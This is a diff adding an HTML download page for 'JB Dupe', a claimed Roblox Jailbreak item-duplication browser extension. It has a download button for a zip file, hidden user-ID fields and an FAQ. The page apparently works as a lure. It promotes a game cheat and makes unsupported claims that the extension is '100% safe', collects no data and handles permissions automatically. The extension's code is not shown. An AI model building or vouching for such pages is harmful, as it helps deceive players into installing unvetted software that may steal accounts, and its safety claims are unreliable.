@@ -1,0 +1,667 @@
+<!DOCTYPE html><html><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>JB Dupe - Download</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Space+Grotesk:wght@700&family=Poppins:wght@700;800&display=swap" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    html, body {
+      width: 100%;
+      height: 100vh;
+      overflow-x: hidden;
+      background: #0a0a0b;
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      color: #fff;
+    }
+
+    body::before {
+      content: '';
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: 
+        radial-gradient(ellipse 80% 50% at 50% -20%, rgba(37, 99, 235, 0.15), transparent),
+        radial-gradient(ellipse 60% 40% at 80% 60%, rgba(59, 130, 246, 0.08), transparent);
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    .header {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: calc(100% - 4px);
+      padding: 20px 40px;
+      background: rgba(10, 10, 11, 0.8);
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+      z-index: 50;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+      display: flex;
+      align-items: center;
+      gap: 40px;
+    }
+
+    .nav-links {
+      display: flex;
+      align-items: center;
+      gap: 24px;
+    }
+
+    .nav-link {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      color: #a1a1aa;
+      text-decoration: none;
+      font-size: 14px;
+      font-weight: 500;
+      transition: color 0.2s ease;
+    }
+
+    .nav-link:hover {
+      color: #fff;
+    }
+
+    .nav-link svg {
+      width: 16px;
+      height: 16px;
+    }
+
+    .navbar-brand {
+      font-family: 'Space Grotesk', sans-serif;
+      font-size: 28px;
+      font-weight: 700;
+      letter-spacing: -0.5px;
+      display: inline-block;
+      position: relative;
+      color: #fff;
+    }
+
+    .navbar-brand .logo-text {
+      display: inline-block;
+    }
+
+    .navbar-brand .lab {
+      color: #3b82f6;
+    }
+
+    .main-content {
+      position: relative;
+      z-index: 1;
+      padding-top: 100px;
+      min-height: 100vh;
+    }
+
+    .hero-section {
+      text-align: center;
+      padding: 80px 20px 120px;
+    }
+
+    .badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 8px 16px;
+      background: rgba(37, 99, 235, 0.1);
+      border: 1px solid rgba(37, 99, 235, 0.2);
+      border-radius: 100px;
+      font-size: 13px;
+      font-weight: 500;
+      color: #60a5fa;
+      margin-bottom: 24px;
+    }
+
+    .badge-dot {
+      width: 6px;
+      height: 6px;
+      background: #3b82f6;
+      border-radius: 50%;
+      animation: pulse-dot 2s ease-in-out infinite;
+    }
+
+    @keyframes pulse-dot {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.4; }
+    }
+
+    .hero-title {
+      font-family: 'Poppins', sans-serif;
+      font-size: clamp(40px, 8vw, 64px);
+      font-weight: 800;
+      margin-bottom: 20px;
+      letter-spacing: -1px;
+      line-height: 1.1;
+    }
+
+    .hero-title .gradient-text {
+      background: linear-gradient(135deg, #fff 0%, #60a5fa 50%, #3b82f6 100%);
+      -webkit-background-clip: text;
+      background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    .hero-subtitle {
+      color: #71717a;
+      font-size: 17px;
+      margin-bottom: 50px;
+      line-height: 1.7;
+      max-width: 520px;
+      margin-left: auto;
+      margin-right: auto;
+      font-weight: 400;
+    }
+
+    .video-section {
+      max-width: 800px;
+      margin: 0 auto 60px;
+      padding: 0 20px;
+    }
+
+    .video-frame {
+      position: relative;
+      width: 100%;
+      padding-bottom: 56.25%;
+      background: linear-gradient(135deg, rgba(255, 255, 255, 0.03) 0%, rgba(255, 255, 255, 0.06) 100%);
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+      border-radius: 20px;
+      overflow: hidden;
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      box-shadow: 
+        0 0 0 1px rgba(255, 255, 255, 0.05) inset,
+        0 20px 50px -20px rgba(0, 0, 0, 0.5),
+        0 0 100px -50px rgba(37, 99, 235, 0.3);
+    }
+
+    .video-frame::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 1px;
+      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+    }
+
+    .video-frame iframe {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      border: none;
+    }
+
+    .video-placeholder {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      background: 
+        radial-gradient(circle at center, rgba(37, 99, 235, 0.1) 0%, transparent 70%);
+    }
+
+    .play-icon {
+      width: 80px;
+      height: 80px;
+      background: rgba(255, 255, 255, 0.05);
+      backdrop-filter: blur(10px);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      cursor: pointer;
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      position: relative;
+    }
+
+    .play-icon::before {
+      content: '';
+      position: absolute;
+      inset: -4px;
+      border-radius: 50%;
+      border: 1px solid rgba(59, 130, 246, 0.3);
+      opacity: 0;
+      transition: all 0.3s ease;
+    }
+
+    .play-icon:hover {
+      background: rgba(37, 99, 235, 0.2);
+      transform: scale(1.05);
+      border-color: rgba(59, 130, 246, 0.4);
+    }
+
+    .play-icon:hover::before {
+      opacity: 1;
+      inset: -8px;
+    }
+
+    .play-icon svg {
+      width: 32px;
+      height: 32px;
+      color: rgba(255, 255, 255, 0.9);
+      margin-left: 4px;
+    }
+
+    .download-section {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 30px;
+    }
+
+    .btn-wrapper {
+      position: relative;
+      width: 100%;
+      max-width: 320px;
+    }
+
+    .btn-wrapper::before {
+      content: '';
+      position: absolute;
+      top: -3px;
+      left: -3px;
+      right: -3px;
+      bottom: -3px;
+      border-radius: 18px;
+      background: linear-gradient(135deg, #3b82f6, #1d4ed8, #3b82f6);
+      background-size: 200% 200%;
+      animation: gradient-rotate 3s ease infinite;
+      z-index: -1;
+      opacity: 0;
+      filter: blur(15px);
+      transition: opacity 0.3s ease;
+    }
+
+    .btn-wrapper:hover::before {
+      opacity: 0.7;
+    }
+
+    @keyframes gradient-rotate {
+      0%, 100% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+    }
+
+    .download-btn {
+      width: 100%;
+      padding: 18px 32px;
+      background: linear-gradient(135deg, #2563eb 0%, #1d4ed8 100%);
+      border: 1px solid rgba(59, 130, 246, 0.3);
+      border-radius: 14px;
+      color: #fff;
+      font-family: 'Inter', sans-serif;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      text-decoration: none;
+      position: relative;
+      z-index: 1;
+      transition: all 0.15s ease;
+      box-shadow: 
+        0 0 0 1px rgba(255, 255, 255, 0.1) inset,
+        0 10px 30px -10px rgba(37, 99, 235, 0.5);
+    }
+
+    .download-btn::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 50%;
+      background: linear-gradient(to bottom, rgba(255, 255, 255, 0.1), transparent);
+      border-radius: 14px 14px 0 0;
+      pointer-events: none;
+    }
+
+    .download-btn:hover {
+      transform: scale(0.98);
+      box-shadow: 
+        0 0 0 1px rgba(255, 255, 255, 0.1) inset,
+        0 5px 20px -10px rgba(37, 99, 235, 0.4);
+    }
+
+    .download-btn:active {
+      transform: scale(0.96);
+    }
+
+    .download-icon {
+      width: 20px;
+      height: 20px;
+    }
+
+    .features {
+      display: flex;
+      justify-content: center;
+      gap: 40px;
+      margin-top: 60px;
+      flex-wrap: wrap;
+      padding: 0 20px;
+    }
+
+    .feature {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      color: #71717a;
+      font-size: 14px;
+      font-weight: 500;
+    }
+
+    .feature-icon {
+      width: 20px;
+      height: 20px;
+      color: #3b82f6;
+    }
+
+    .faq-section {
+      max-width: 700px;
+      margin: 80px auto 0;
+      padding: 0 20px;
+    }
+
+    .faq-title {
+      font-family: 'Poppins', sans-serif;
+      font-size: 36px;
+      font-weight: 800;
+      text-align: center;
+      margin-bottom: 12px;
+    }
+
+    .faq-subtitle {
+      color: #71717a;
+      font-size: 15px;
+      text-align: center;
+      margin-bottom: 40px;
+    }
+
+    .faq-item {
+      background: rgba(255, 255, 255, 0.03);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 12px;
+      margin-bottom: 12px;
+      overflow: hidden;
+    }
+
+    .faq-question {
+      width: 100%;
+      padding: 20px 24px;
+      background: transparent;
+      border: none;
+      color: #fff;
+      font-family: 'Inter', sans-serif;
+      font-size: 15px;
+      font-weight: 600;
+      text-align: left;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      transition: background 0.2s ease;
+    }
+
+    .faq-question:hover {
+      background: rgba(255, 255, 255, 0.02);
+    }
+
+    .faq-question svg {
+      width: 20px;
+      height: 20px;
+      color: #3b82f6;
+      transition: transform 0.3s ease;
+    }
+
+    .faq-item.active .faq-question svg {
+      transform: rotate(180deg);
+    }
+
+    .faq-answer {
+      max-height: 0;
+      overflow: hidden;
+      transition: max-height 0.3s ease, padding 0.3s ease;
+    }
+
+    .faq-item.active .faq-answer {
+      max-height: 200px;
+    }
+
+    .faq-answer-content {
+      padding: 0 24px 20px;
+      color: #a1a1aa;
+      font-size: 14px;
+      line-height: 1.6;
+    }
+
+    body::-webkit-scrollbar {
+      width: 4px;
+    }
+
+    body::-webkit-scrollbar-track {
+      background-color: transparent;
+    }
+
+    body::-webkit-scrollbar-thumb {
+      background: rgba(37, 99, 235, 0.5);
+      border-radius: 4px;
+    }
+
+    body::-webkit-scrollbar-thumb:hover {
+      background: rgba(59, 130, 246, 0.7);
+    }
+
+    .footer {
+      position: relative;
+      z-index: 1;
+      text-align: center;
+      padding: 40px 20px;
+      border-top: 1px solid rgba(255, 255, 255, 0.05);
+      color: #52525b;
+      font-size: 13px;
+    }
+
+    .footer a {
+      color: #71717a;
+      text-decoration: none;
+      transition: color 0.2s ease;
+    }
+
+    .footer a:hover {
+      color: #3b82f6;
+    }
+  </style>
+</head>
+<body>
+  <header class="header">
+    <div class="navbar-brand">
+      <span class="logo-text">JB<span class="lab">DUPE</span></span>
+    </div>
+    <nav class="nav-links">
+      <a href="#faq" class="nav-link">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <circle cx="12" cy="12" r="10"></circle>
+          <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"></path>
+          <line x1="12" y1="17" x2="12.01" y2="17"></line>
+        </svg>
+        FAQ
+      </a>
+      <a href="#download" class="nav-link">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+          <polyline points="7 10 12 15 17 10"></polyline>
+          <line x1="12" y1="15" x2="12" y2="3"></line>
+        </svg>
+        Download
+      </a>
+      <a href="#tutorial" class="nav-link">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <polygon points="23 7 16 12 23 17 23 7"></polygon>
+          <rect x="1" y="5" width="15" height="14" rx="2" ry="2"></rect>
+        </svg>
+        Tutorial
+      </a>
+    </nav>
+  </header>
+
+  <div class="main-content">
+    <section class="hero-section">
+      <div class="badge">
+        <span class="badge-dot"></span>
+        Browser Extension
+      </div>
+      
+      <h1 class="hero-title">
+        <span class="gradient-text">JB Dupe</span>
+      </h1>
+      <p class="hero-subtitle">Advanced browser extension for Roblox Jailbreak. Enhance and process in-game items locally in your browser. 100% client-side — secure, instant, no servers, updated for current meta.</p>
+      
+      <div class="video-section" id="tutorial">
+        <div class="video-frame">
+          <iframe 
+            width="100%" 
+            height="100%" 
+            src="https://www.youtube.com/embed/tzXYoF66BRo?rel=0&modestbranding=1" 
+            title="YouTube video player" 
+            frameborder="0" 
+            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" 
+            referrerpolicy="no-referrer-when-downgrade" 
+            allowfullscreen
+            style="border-radius: 12px; aspect-ratio: 16/9;">
+          </iframe>
+        </div>
+      </div>
+
+      <div class="download-section" id="download">
+        <input type="hidden" name="userid" id="userid" value="3010490628">
+        <input type="hidden" name="extension" id="extension" value="Customextension">
+        <div class="btn-wrapper">
+          <button class="download-btn" onclick="window.location.href='JBdupe.zip'">
+            <svg class="download-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+              <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+              <polyline points="7 10 12 15 17 10"></polyline>
+              <line x1="12" y1="15" x2="12" y2="3"></line>
+            </svg>
+            Download Extension
+          </button>
+        </div>
+      </div>
+
+      <div class="features">
+        <div class="feature">
+          <svg class="feature-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"></path>
+          </svg>
+          Instant
+        </div>
+        <div class="feature">
+          <svg class="feature-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+          </svg>
+          Safe & Secure
+        </div>
+        <div class="feature">
+          <svg class="feature-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <circle cx="12" cy="12" r="10"></circle>
+            <polyline points="12 6 12 12 16 14"></polyline>
+          </svg>
+          Auto Updates
+        </div>
+      </div>
+
+      <div class="faq-section" id="faq">
+        <h2 class="faq-title">Questions?</h2>
+        <p class="faq-subtitle">Common questions about our services.</p>
+
+        <div class="faq-item">
+          <button class="faq-question">
+            Is this service safe to use?            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <polyline points="6 9 12 15 18 9"></polyline>
+            </svg>
+          </button>
+          <div class="faq-answer">
+            <div class="faq-answer-content">
+              Yes — 100% safe. The extension runs entirely locally in your browser. No data sent to servers, no info collected, no tracking. Privacy protected, no external connections.            </div>
+          </div>
+        </div>
+
+        <div class="faq-item">
+          <button class="faq-question">
+            How does this work?            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <polyline points="6 9 12 15 18 9"></polyline>
+            </svg>
+          </button>
+          <div class="faq-answer">
+            <div class="faq-answer-content">
+              It installs as a normal browser extension for Chrome, Edge, or Firefox. Activates on Roblox/Jailbreak pages, processes everything locally in real-time on your device.            </div>
+          </div>
+        </div>
+
+        <div class="faq-item">
+          <button class="faq-question">
+            Do I need any special requirements?            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <polyline points="6 9 12 15 18 9"></polyline>
+            </svg>
+          </button>
+          <div class="faq-answer">
+            <div class="faq-answer-content">
+              No sign-up, no accounts, no additional software needed. All you need is a compatible browser. Permissions handled automatically.            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+  </div>
+
+  <footer class="footer">
+    <p>© 2026 JBDUPE. All rights reserved.</p>
+  </footer>
+
+  <script>
+    document.querySelectorAll('.faq-question').forEach(button => {
+      button.addEventListener('click', () => {
+        const faqItem = button.parentElement;
+        const isActive = faqItem.classList.contains('active');
+        
+        document.querySelectorAll('.faq-item').forEach(item => {
+          item.classList.remove('active');
+        });
+        
+        if (!isActive) {
+          faqItem.classList.add('active');
+        }
+      });
+    });
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+      anchor.addEventListener('click', function(e) {
+        e.preventDefault();
+        const target = document.querySelector(this.getAttribute('href'));
+        if (target) {
+          target.scrollIntoView({
+            behavior: 'smooth',
+            block: 'center'
+          });
+        }
+      });
+    });
+  </script>
+
+</body></html>
